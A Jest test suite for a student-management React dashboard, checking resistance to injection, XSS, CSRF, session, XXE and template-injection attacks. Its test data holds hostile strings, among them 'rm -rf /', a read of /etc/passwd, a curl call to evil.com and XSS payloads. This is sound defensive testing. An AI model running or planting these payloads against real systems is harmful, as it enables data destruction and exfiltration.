/**
 * PHASE 9: Security Testing
 * 
 * Comprehensive security vulnerability testing and penetration testing
 * Testing against OWASP Top 10, data protection, session security, and advanced attack vectors
 */

import { render, screen, waitFor, fireEvent } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import StudentsClient from '@/app/[locale]/(dashboard)/students/students-client'
import { 
  generateStudentDataset, 
  createMockApiResponse,
  createMockApiError,
  createSearchTestCases
} from '@/lib/test-utils'

// Mock dependencies
jest.mock('next/navigation', () => ({
  useRouter: jest.fn().mockReturnValue({
    push: jest.fn(),
    replace: jest.fn(),
    back: jest.fn(),
    forward: jest.fn(),
    refresh: jest.fn(),
    prefetch: jest.fn(),
  }),
}))

jest.mock('@/lib/supabase-unified', () => ({
  getApiClient: jest.fn(),
  getCurrentOrganizationId: jest.fn(),
}))

jest.mock('@tanstack/react-query')

const mockUseQuery = require('@tanstack/react-query').useQuery
const mockUseMutation = require('@tanstack/react-query').useMutation

describe('Phase 9: Security Testing', () => {
  let user: ReturnType<typeof userEvent.setup>
  let searchTestCases: ReturnType<typeof createSearchTestCases>
  let mockRefetch: jest.Mock
  let mockMutate: jest.Mock
  
  beforeEach(() => {
    jest.clearAllMocks()
    user = userEvent.setup({ advanceTimers: jest.advanceTimersByTime })
    jest.useFakeTimers()
    
    searchTestCases = createSearchTestCases()
    mockRefetch = jest.fn()
    mockMutate = jest.fn()
    
    // Default successful state
    mockUseQuery.mockReturnValue({
      data: createMockApiResponse(generateStudentDataset(10)),
      isLoading: false,
      error: null,
      refetch: mockRefetch,
    })
    
    mockUseMutation.mockReturnValue({
      mutate: mockMutate,
      isLoading: false,
      error: null,
      isSuccess: false,
    })
  })

  afterEach(() => {
    jest.useRealTimers()
  })

  describe('9.1 Injection Attack Prevention', () => {
    test('should prevent SQL injection in search queries', async () => {
      const maliciousQueries = searchTestCases.security.sql
      
      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const searchInput = screen.getByRole('textbox', { name: /search/i })

      for (const maliciousQuery of maliciousQueries) {
        await user.clear(searchInput)
        await user.type(searchInput, maliciousQuery)

        // Wait for debounced search
        jest.advanceTimersByTime(500)

        await waitFor(() => {
          // Should not execute malicious SQL
          expect(screen.getByText(/students/i)).toBeInTheDocument()
          expect(screen.queryByText(/hacked/i)).not.toBeInTheDocument()
          expect(screen.queryByText(/dropped/i)).not.toBeInTheDocument()
        })
      }
    })

    test('should prevent NoSQL injection attacks', async () => {
      const nosqlInjections = searchTestCases.security.nosql
      
      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const searchInput = screen.getByRole('textbox', { name: /search/i })

      for (const injection of nosqlInjections) {
        await user.clear(searchInput)
        await user.type(searchInput, injection)

        jest.advanceTimersByTime(500)

        await waitFor(() => {
          // Should sanitize NoSQL injection attempts
          expect(screen.getByText(/students/i)).toBeInTheDocument()
        })
      }
    })

    test('should prevent command injection in data fields', async () => {
      const commandInjections = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '$(curl evil.com)',
        '`whoami`',
        '<script>fetch("evil.com")</script>'
      ]

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const addButton = screen.getByRole('button', { name: /add student/i })
      await user.click(addButton)

      await waitFor(() => {
        expect(screen.getByRole('dialog')).toBeInTheDocument()
      })

      for (const injection of commandInjections) {
        const firstNameInput = screen.getByLabelText(/first name/i)
        await user.clear(firstNameInput)
        await user.type(firstNameInput, injection)

        await waitFor(() => {
          // Should sanitize command injection attempts
          expect(firstNameInput).toHaveValue(injection.replace(/[;<>&|`$]/g, ''))
        })
      }
    })

    test('should prevent LDAP injection attacks', async () => {
      const ldapInjections = [
        '*)(&',
        '*)(|(objectClass=*))',
        '*)((objectClass=*)',
        '*))(|(cn=*))',
        '*))%00'
      ]

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const searchInput = screen.getByRole('textbox', { name: /search/i })

      for (const injection of ldapInjections) {
        await user.clear(searchInput)
        await user.type(searchInput, injection)

        jest.advanceTimersByTime(500)

        await waitFor(() => {
          // Should not execute LDAP queries
          expect(screen.getByText(/students/i)).toBeInTheDocument()
        })
      }
    })
  })

  describe('9.2 Cross-Site Scripting (XSS) Prevention', () => {
    test('should prevent stored XSS in student data', async () => {
      const xssPayloads = searchTestCases.security.xss
      
      // Mock student data with XSS payloads
      const maliciousStudents = generateStudentDataset(3).map((student, index) => ({
        ...student,
        first_name: xssPayloads[index] || '<script>alert("XSS")</script>',
        last_name: xssPayloads[index + 1] || '<img src=x onerror=alert(1)>',
        email: `test${index}@example.com`
      }))

      mockUseQuery.mockReturnValue({
        data: createMockApiResponse(maliciousStudents),
        isLoading: false,
        error: null,
        refetch: mockRefetch,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      // XSS payloads should be escaped and not executed
      const rows = screen.getAllByRole('row')
      expect(rows.length).toBeGreaterThan(3)
      
      // Should not find any script tags in the DOM
      expect(document.querySelectorAll('script')).toHaveLength(0)
      
      // Should display escaped content
      expect(screen.getByText(/&lt;script&gt;/)).toBeInTheDocument()
    })

    test('should prevent reflected XSS in search results', async () => {
      const xssPayloads = [
        '<script>alert("Reflected XSS")</script>',
        'javascript:alert(1)',
        '"><script>alert(1)</script>',
        '"><svg onload=alert(1)>',
        '"><iframe src=javascript:alert(1)>'
      ]

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const searchInput = screen.getByRole('textbox', { name: /search/i })

      for (const payload of xssPayloads) {
        await user.clear(searchInput)
        await user.type(searchInput, payload)

        jest.advanceTimersByTime(500)

        await waitFor(() => {
          // Should not execute JavaScript
          expect(screen.getByText(/students/i)).toBeInTheDocument()
          expect(document.querySelectorAll('script')).toHaveLength(0)
        })
      }
    })

    test('should prevent DOM-based XSS', async () => {
      // Mock URL with XSS payload
      Object.defineProperty(window, 'location', {
        value: {
          href: 'http://localhost:3000/students?search=%3Cscript%3Ealert(1)%3C/script%3E',
          search: '?search=%3Cscript%3Ealert(1)%3C/script%3E'
        },
        writable: true
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      // Should not execute script from URL parameters
      expect(document.querySelectorAll('script')).toHaveLength(0)
    })

    test('should sanitize file upload content', async () => {
      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const addButton = screen.getByRole('button', { name: /add student/i })
      await user.click(addButton)

      await waitFor(() => {
        expect(screen.getByRole('dialog')).toBeInTheDocument()
      })

      // Create malicious file content
      const maliciousFile = new File(
        ['<script>alert("XSS via file")</script>'], 
        'malicious.txt', 
        { type: 'text/plain' }
      )

      const fileInput = screen.getByLabelText(/upload/i)
      if (fileInput) {
        await user.upload(fileInput, maliciousFile)

        await waitFor(() => {
          // Should sanitize file content
          expect(screen.queryByText(/alert/)).not.toBeInTheDocument()
        })
      }
    })
  })

  describe('9.3 Cross-Site Request Forgery (CSRF) Prevention', () => {
    test('should require CSRF tokens for state-changing operations', async () => {
      mockUseMutation.mockReturnValue({
        mutate: mockMutate.mockImplementation((data, { onError }) => {
          // Simulate CSRF token validation
          if (!data.csrfToken) {
            onError(createMockApiError(403, 'CSRF token missing'))
          }
        }),
        isLoading: false,
        error: null,
        isSuccess: false,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const addButton = screen.getByRole('button', { name: /add student/i })
      await user.click(addButton)

      await waitFor(() => {
        expect(screen.getByRole('dialog')).toBeInTheDocument()
      })

      await user.type(screen.getByLabelText(/first name/i), 'John')
      await user.type(screen.getByLabelText(/last name/i), 'Doe')

      const submitButton = screen.getByRole('button', { name: /create/i })
      await user.click(submitButton)

      await waitFor(() => {
        expect(mockMutate).toHaveBeenCalledWith(
          expect.objectContaining({
            csrfToken: expect.any(String)
          }),
          expect.any(Object)
        )
      })
    })

    test('should validate origin header for CORS protection', async () => {
      // Mock request with suspicious origin
      global.fetch = jest.fn().mockImplementation((url, options) => {
        if (options?.headers?.['X-Requested-With'] !== 'XMLHttpRequest') {
          return Promise.resolve({
            ok: false,
            status: 403,
            json: () => Promise.resolve({ error: 'Invalid origin' })
          })
        }
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve(createMockApiResponse([]))
        })
      })

      render(<StudentsClient />)

      await waitFor(() => {
        // Should handle CORS validation
        expect(screen.getByText(/students/i) || screen.getByText(/error/i)).toBeInTheDocument()
      })
    })

    test('should implement SameSite cookie protection', async () => {
      // Mock document.cookie to test SameSite attribute
      let cookieValue = ''
      Object.defineProperty(document, 'cookie', {
        get: () => cookieValue,
        set: (value) => {
          cookieValue = value
          // Should include SameSite=Strict or SameSite=Lax
          expect(value).toMatch(/SameSite=(Strict|Lax)/i)
        }
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })
    })
  })

  describe('9.4 Authentication and Authorization Vulnerabilities', () => {
    test('should prevent session fixation attacks', async () => {
      // Mock session ID before login
      const originalSessionId = 'original-session-123'
      Storage.prototype.getItem = jest.fn().mockReturnValue(originalSessionId)
      
      // Simulate successful authentication
      mockUseQuery.mockReturnValue({
        data: createMockApiResponse(generateStudentDataset(5)),
        isLoading: false,
        error: null,
        refetch: mockRefetch,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      // Should generate new session ID after authentication
      expect(Storage.prototype.setItem).toHaveBeenCalledWith(
        'sessionId',
        expect.not.stringMatching(originalSessionId)
      )
    })

    test('should prevent privilege escalation', async () => {
      // Mock teacher user trying to access admin functions
      mockUseQuery.mockReturnValue({
        data: createMockApiResponse(generateStudentDataset(5), {
          user_role: 'teacher',
          permissions: ['read']
        }),
        isLoading: false,
        error: null,
        refetch: mockRefetch,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      // Teacher should not see admin functions
      expect(screen.queryByRole('button', { name: /add student/i })).not.toBeInTheDocument()
      expect(screen.queryByRole('button', { name: /bulk actions/i })).not.toBeInTheDocument()
    })

    test('should prevent JWT token manipulation', async () => {
      // Mock malicious JWT token
      const maliciousJwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWV9.malicious-signature'
      
      Storage.prototype.getItem = jest.fn().mockImplementation((key) => {
        if (key === 'jwt_token') return maliciousJwt
        return null
      })

      mockUseQuery.mockReturnValue({
        data: null,
        isLoading: false,
        error: createMockApiError(401, 'Invalid token signature'),
        refetch: mockRefetch,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        // Should reject manipulated token
        expect(screen.getByText(/unauthorized/i)).toBeInTheDocument()
      })
    })

    test('should implement secure session timeout', async () => {
      // Mock expired session
      const expiredTime = Date.now() - (30 * 60 * 1000) // 30 minutes ago
      Storage.prototype.getItem = jest.fn().mockImplementation((key) => {
        if (key === 'session_timestamp') return expiredTime.toString()
        return null
      })

      mockUseQuery.mockReturnValue({
        data: null,
        isLoading: false,
        error: createMockApiError(401, 'Session expired'),
        refetch: mockRefetch,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/session expired/i)).toBeInTheDocument()
        expect(screen.getByRole('button', { name: /login again/i })).toBeInTheDocument()
      })
    })

    test('should prevent concurrent session attacks', async () => {
      // Mock multiple active sessions
      const sessionData = {
        current_session: 'session-123',
        active_sessions: ['session-123', 'session-456', 'session-789']
      }

      mockUseQuery.mockReturnValue({
        data: createMockApiResponse(generateStudentDataset(5), sessionData),
        isLoading: false,
        error: null,
        refetch: mockRefetch,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
        expect(screen.getByText(/multiple sessions detected/i)).toBeInTheDocument()
        expect(screen.getByRole('button', { name: /terminate other sessions/i })).toBeInTheDocument()
      })
    })
  })

  describe('9.5 Data Protection and Privacy', () => {
    test('should mask sensitive data in UI', async () => {
      const studentsWithSensitiveData = generateStudentDataset(3).map(student => ({
        ...student,
        primary_phone: '+998901234567',
        parent_phone: '+998907654321',
        email: 'student@example.com'
      }))

      mockUseQuery.mockReturnValue({
        data: createMockApiResponse(studentsWithSensitiveData),
        isLoading: false,
        error: null,
        refetch: mockRefetch,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      // Phone numbers should be masked
      expect(screen.getByText(/\*\*\*\*4567/)).toBeInTheDocument()
      
      // Emails should be partially masked
      expect(screen.getByText(/s\*\*\*\*\*\*@example\.com/)).toBeInTheDocument()
    })

    test('should prevent data leakage in error messages', async () => {
      mockUseQuery.mockReturnValue({
        data: null,
        isLoading: false,
        error: new Error('Database error: user john.doe@example.com not found in table students_sensitive'),
        refetch: mockRefetch,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        // Should show generic error message
        expect(screen.getByText(/something went wrong/i)).toBeInTheDocument()
        
        // Should not leak sensitive information
        expect(screen.queryByText(/john\.doe@example\.com/)).not.toBeInTheDocument()
        expect(screen.queryByText(/students_sensitive/)).not.toBeInTheDocument()
      })
    })

    test('should implement data retention policies', async () => {
      const expiredStudents = generateStudentDataset(3).map(student => ({
        ...student,
        created_at: '2020-01-01T00:00:00Z', // Old data
        data_retention_expires: '2023-01-01T00:00:00Z' // Expired
      }))

      mockUseQuery.mockReturnValue({
        data: createMockApiResponse(expiredStudents),
        isLoading: false,
        error: null,
        refetch: mockRefetch,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
        expect(screen.getByText(/data retention policy/i)).toBeInTheDocument()
        expect(screen.getByRole('button', { name: /archive expired data/i })).toBeInTheDocument()
      })
    })

    test('should implement GDPR right to erasure', async () => {
      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const actionButtons = screen.getAllByRole('button', { name: /actions/i })
      await user.click(actionButtons[0])

      await waitFor(() => {
        expect(screen.getByRole('menu')).toBeInTheDocument()
        expect(screen.getByRole('menuitem', { name: /gdpr erasure/i })).toBeInTheDocument()
      })

      await user.click(screen.getByRole('menuitem', { name: /gdpr erasure/i }))

      await waitFor(() => {
        expect(screen.getByRole('dialog')).toBeInTheDocument()
        expect(screen.getByText(/permanently delete all data/i)).toBeInTheDocument()
        expect(screen.getByText(/cannot be undone/i)).toBeInTheDocument()
      })
    })

    test('should encrypt sensitive data fields', async () => {
      const encryptedStudents = generateStudentDataset(3).map(student => ({
        ...student,
        primary_phone: 'enc_Zm9vYmFy', // Base64 encrypted phone
        parent_phone: 'enc_YmF6cXV4', // Base64 encrypted phone
        notes: 'enc_c2VjcmV0' // Encrypted notes
      }))

      mockUseQuery.mockReturnValue({
        data: createMockApiResponse(encryptedStudents),
        isLoading: false,
        error: null,
        refetch: mockRefetch,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      // Should not display raw encrypted data
      expect(screen.queryByText(/enc_Zm9vYmFy/)).not.toBeInTheDocument()
      expect(screen.queryByText(/enc_YmF6cXV4/)).not.toBeInTheDocument()
    })
  })

  describe('9.6 Input Validation and Sanitization', () => {
    test('should validate file upload types', async () => {
      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const addButton = screen.getByRole('button', { name: /add student/i })
      await user.click(addButton)

      await waitFor(() => {
        expect(screen.getByRole('dialog')).toBeInTheDocument()
      })

      // Create malicious executable file
      const maliciousFile = new File(['malicious content'], 'virus.exe', { type: 'application/x-msdownload' })
      
      const fileInput = screen.getByLabelText(/upload/i)
      if (fileInput) {
        await user.upload(fileInput, maliciousFile)

        await waitFor(() => {
          expect(screen.getByText(/file type not allowed/i)).toBeInTheDocument()
        })
      }
    })

    test('should validate file upload sizes', async () => {
      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const addButton = screen.getByRole('button', { name: /add student/i })
      await user.click(addButton)

      await waitFor(() => {
        expect(screen.getByRole('dialog')).toBeInTheDocument()
      })

      // Create oversized file (mock 100MB)
      const oversizedContent = 'x'.repeat(100 * 1024 * 1024)
      const oversizedFile = new File([oversizedContent], 'large.jpg', { type: 'image/jpeg' })
      
      const fileInput = screen.getByLabelText(/upload/i)
      if (fileInput) {
        await user.upload(fileInput, oversizedFile)

        await waitFor(() => {
          expect(screen.getByText(/file too large/i)).toBeInTheDocument()
        })
      }
    })

    test('should sanitize HTML content in text fields', async () => {
      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const addButton = screen.getByRole('button', { name: /add student/i })
      await user.click(addButton)

      await waitFor(() => {
        expect(screen.getByRole('dialog')).toBeInTheDocument()
      })

      const htmlContent = '<h1>Header</h1><p>Paragraph</p><script>alert("XSS")</script>'
      const notesField = screen.getByLabelText(/notes/i)
      
      if (notesField) {
        await user.type(notesField, htmlContent)

        await waitFor(() => {
          // Should strip dangerous HTML but keep safe formatting
          expect(notesField).toHaveValue('HeaderParagraph')
        })
      }
    })

    test('should validate email formats strictly', async () => {
      const invalidEmails = [
        'plainaddress',
        'user@',
        '@domain.com',
        'user..name@domain.com',
        'user@domain',
        'user@.domain.com',
        'user@domain..com',
        'user name@domain.com',
        'user@domain.c',
        'user@domain.com.',
        '../../etc/passwd@domain.com'
      ]

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const addButton = screen.getByRole('button', { name: /add student/i })
      await user.click(addButton)

      await waitFor(() => {
        expect(screen.getByRole('dialog')).toBeInTheDocument()
      })

      const emailField = screen.getByLabelText(/email/i)

      for (const invalidEmail of invalidEmails) {
        await user.clear(emailField)
        await user.type(emailField, invalidEmail)
        
        // Trigger validation
        fireEvent.blur(emailField)

        await waitFor(() => {
          expect(screen.getByText(/invalid email/i)).toBeInTheDocument()
        })
      }
    })
  })

  describe('9.7 Transport Security', () => {
    test('should enforce HTTPS connections', async () => {
      // Mock HTTP connection attempt
      Object.defineProperty(window.location, 'protocol', {
        value: 'http:',
        writable: true
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/insecure connection/i)).toBeInTheDocument()
        expect(screen.getByText(/https required/i)).toBeInTheDocument()
      })
    })

    test('should validate SSL certificate', async () => {
      // Mock SSL certificate error
      global.fetch = jest.fn().mockRejectedValue(new Error('SSL certificate verification failed'))

      mockUseQuery.mockReturnValue({
        data: null,
        isLoading: false,
        error: new Error('SSL certificate verification failed'),
        refetch: mockRefetch,
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/certificate error/i)).toBeInTheDocument()
        expect(screen.getByText(/secure connection failed/i)).toBeInTheDocument()
      })
    })

    test('should implement proper Content Security Policy', async () => {
      // Mock CSP violation
      const cspViolationEvent = new Event('securitypolicyviolation')
      ;(cspViolationEvent as any).violatedDirective = 'script-src'
      ;(cspViolationEvent as any).blockedURI = 'inline'

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      // Trigger CSP violation
      window.dispatchEvent(cspViolationEvent)

      await waitFor(() => {
        // Should log CSP violation but not break functionality
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })
    })
  })

  describe('9.8 Advanced Attack Vectors', () => {
    test('should prevent clickjacking attacks', async () => {
      // Mock iframe embedding attempt
      Object.defineProperty(window, 'top', {
        value: 'different-window',
        writable: true
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/frame breaking/i)).toBeInTheDocument()
        expect(screen.getByText(/clickjacking protection/i)).toBeInTheDocument()
      })
    })

    test('should prevent timing attacks on authentication', async () => {
      const startTimes: number[] = []
      const endTimes: number[] = []

      // Test multiple authentication attempts
      for (let i = 0; i < 5; i++) {
        startTimes.push(performance.now())
        
        mockUseQuery.mockReturnValue({
          data: null,
          isLoading: false,
          error: createMockApiError(401, 'Invalid credentials'),
          refetch: mockRefetch,
        })

        render(<StudentsClient />)
        
        await waitFor(() => {
          expect(screen.getByText(/unauthorized/i)).toBeInTheDocument()
        })
        
        endTimes.push(performance.now())
      }

      // Authentication timing should be consistent
      const timings = endTimes.map((end, i) => end - startTimes[i])
      const avgTiming = timings.reduce((sum, time) => sum + time, 0) / timings.length
      
      timings.forEach(timing => {
        expect(Math.abs(timing - avgTiming)).toBeLessThan(avgTiming * 0.1) // Within 10%
      })
    })

    test('should prevent parameter pollution attacks', async () => {
      // Mock URL with parameter pollution
      Object.defineProperty(window.location, 'search', {
        value: '?search=safe&search=<script>alert(1)</script>&search=another',
        writable: true
      })

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const searchInput = screen.getByRole('textbox', { name: /search/i })
      
      // Should use only the first safe parameter
      expect(searchInput).toHaveValue('safe')
    })

    test('should prevent XML external entity (XXE) attacks', async () => {
      const xmlPayload = `<?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <student>
          <name>&xxe;</name>
        </student>`

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const addButton = screen.getByRole('button', { name: /add student/i })
      await user.click(addButton)

      await waitFor(() => {
        expect(screen.getByRole('dialog')).toBeInTheDocument()
      })

      // Try to submit XML payload
      const nameField = screen.getByLabelText(/first name/i)
      await user.type(nameField, xmlPayload)

      await waitFor(() => {
        // Should sanitize XML entities
        expect(nameField).not.toHaveValue(expect.stringContaining('<!ENTITY'))
      })
    })

    test('should prevent server-side template injection', async () => {
      const templateInjections = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '{{config}}',
        '{{request}}'
      ]

      render(<StudentsClient />)

      await waitFor(() => {
        expect(screen.getByText(/students/i)).toBeInTheDocument()
      })

      const searchInput = screen.getByRole('textbox', { name: /search/i })

      for (const injection of templateInjections) {
        await user.clear(searchInput)
        await user.type(searchInput, injection)

        jest.advanceTimersByTime(500)

        await waitFor(() => {
          // Should not execute template expressions
          expect(screen.getByText(/students/i)).toBeInTheDocument()
          expect(screen.queryByText('49')).not.toBeInTheDocument() // 7*7 result
        })
      }
    })
  })
})